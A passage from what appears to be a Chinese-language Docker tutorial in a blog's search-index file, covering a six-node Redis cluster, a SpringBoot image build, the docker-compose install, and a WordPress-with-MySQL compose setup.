class="line">cluster-announce-ip 172.38.0.1$&#123;port&#125;</span><br><span class="line">cluster-announce-port 6379</span><br><span class="line">cluster-announce-bus-port 16379</span><br><span class="line">appendonly yes</span><br><span class="line">EOF</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过脚本运行六个redis</span></span><br><span class="line">for port in $(seq 1 6);\</span><br><span class="line">do \</span><br><span class="line">docker run -p 637$&#123;port&#125;:6379 -p 1667$&#123;port&#125;:16379 --name redis-$&#123;port&#125; \</span><br><span class="line">-v /mydata/redis/node-$&#123;port&#125;/data:/data \</span><br><span class="line">-v /mydata/redis/node-$&#123;port&#125;/conf/redis.conf:/etc/redis/redis.conf \</span><br><span class="line">-d --net redis --ip 172.38.0.1$&#123;port&#125; redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">docker exec -it redis-1 /bin/sh #redis默认没有bash</span><br><span class="line">redis-cli --cluster create 172.38.0.11:6379 172.38.0.12:6379 172.38.0.13:6379 172.38.0.14:6379 172.38.0.15:6379 172.38.0.16:6379  --cluster-replicas 1</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjIwMjkwMjI0MS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>docker搭建redis集群完成！</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjIwMzMyMzk3MS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>我们使用docker之后，所有的技术都会慢慢变得简单起来！</p><h2 id="SpringBoot微服务打包Docker镜像"><a href="#SpringBoot微服务打包Docker镜像" class="headerlink" title="SpringBoot微服务打包Docker镜像"></a>SpringBoot微服务打包Docker镜像</h2><p>1、构建SpringBoot项目</p><p>2、打包运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>3、编写dockerfile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM java:8</span><br><span class="line">COPY *.jar /app.jar</span><br><span class="line">CMD ["--server.port=8080"]</span><br><span class="line">EXPOSE 8080</span><br><span class="line">ENTRYPOINT ["java","-jar","app.jar"]</span><br></pre></td></tr></table></figure><p>4、构建镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1.复制jar和DockerFIle到服务器</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2.构建镜像</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -t xxxxx:xx  .</span></span><br></pre></td></tr></table></figure><p>5、发布运行</p><p>以后我们使用了Docker之后，给别人交付就是一个镜像即可！</p><p>Docker</p><h1 id="十二-集群模式——docker-compose"><a href="#十二-集群模式——docker-compose" class="headerlink" title="十二. 集群模式——docker-compose"></a>十二. 集群模式——docker-compose</h1><h2 id="12-1-安装"><a href="#12-1-安装" class="headerlink" title="12.1 安装"></a>12.1 安装</h2><h5 id="1-下载docker-compose"><a href="#1-下载docker-compose" class="headerlink" title="1. 下载docker-compose"></a>1. 下载docker-compose</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">官方版：（慢）</span><br><span class="line">sudo curl -L "https://github.com/docker/compose/releases/download/1.26.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">社区版：</span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.26.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h5 id="2-验证："><a href="#2-验证：" class="headerlink" title="2. 验证："></a>2. 验证：</h5><blockquote><p>docker-compose version</p></blockquote><p>![image-20200817150538392](X:\Users\xu\Application Data\XMind\workspace-cathy.temp-attachments\attachments\docker.assets\image-20200817150538392.png)</p><h2 id="12-2-使用docker-compose来搭建个人博客"><a href="#12-2-使用docker-compose来搭建个人博客" class="headerlink" title="12.2 使用docker-compose来搭建个人博客"></a>12.2 使用docker-compose来搭建个人博客</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建目录并进入</span><br><span class="line">mkdir my_wordpress</span><br><span class="line"><span class="built_in">cd</span> my_wordpress/</span><br></pre></td></tr></table></figure><blockquote><p>编写docker-compose文件（核心）<br>vim docker-compose.yml</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3.3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">   <span class="attr">db:</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db_data:/var/lib/mysql</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">environment:</span></span><br><span class="line">       <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">somewordpress</span></span><br><span class="line">       <span class="attr">MYSQL_DATABASE:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">MYSQL_USER:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">MYSQL_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line"></span><br><span class="line">   <span class="attr">wordpress:</span></span><br><span class="line">     <span class="attr">depends_on:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">wordpress:latest</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">"8000:80"</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">environment:</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_HOST:</span> <span class="string">db:3306</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_USER:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_PASSWORD:</span> <span class="string">wordpress</span></span><br><span class="line">       <span class="attr">WORDPRESS_DB_NAME:</span> <span class="string">wordpress</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">    <span class="attr">db_data:</span> <span class="string">&#123;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动：</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>![image-20200817164621825](X:\Users\xu\Application Data\XMind\workspace-cathy.temp-attachments\attachments\docker.assets\image-20200817164621825.png)</p><p><img src="http://118.178.195.238/xw_resume/images/page-3/bigdata.jpg" alt="demo"></p><p><a href="https://blog.csp1999.top/blog/blog/29#comment-container" target="_blank" rel="noopener">https://blog.csp1999.top/blog/blog/29#comment-container</a>)</p><p><img src="https://blog.csp1999.top/blog/images/wechat.jpg" alt="img"></p><h4 id="最新博客"><a href="#最新博客" class="headerlink" title="最新博客"></a>最新博客</h4><p><a href="https://blog.csp1999.top/blog/33" target="_blank" rel="noopener">Think in Java 第5章 初始化与清理</a><a href="https://blog.csp1999.top/blog/34" target="_blank" rel="noopener">Think in Java 第10章 内部类</a><a href="https://blog.csp1999.top/blog/31" target="_blank" rel="noopener">Think in Java 第1章 对象导论</a></p><h4 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h4><p><a href="https://blog.csp1999.top/blog/blog/29#" target="_blank" rel="noopener">Email：CSP19990129@163.com</a><a href="https://blog.csp1999.top/blog/blog/29#" target="_blank" rel="noopener">QQ：1165680007</a></p><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4><p>这是我的个人博客、会分享关于编程、写作、思考相关的任何内容，希望可以给来到这儿的人有所帮助…</p><p>HAUST © 2020.5.1 - 2020.5.7 DESIGN BY CAO SHIPENG</p>]]></content>
      
      
      <categories>
          
          <category> 容器化技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
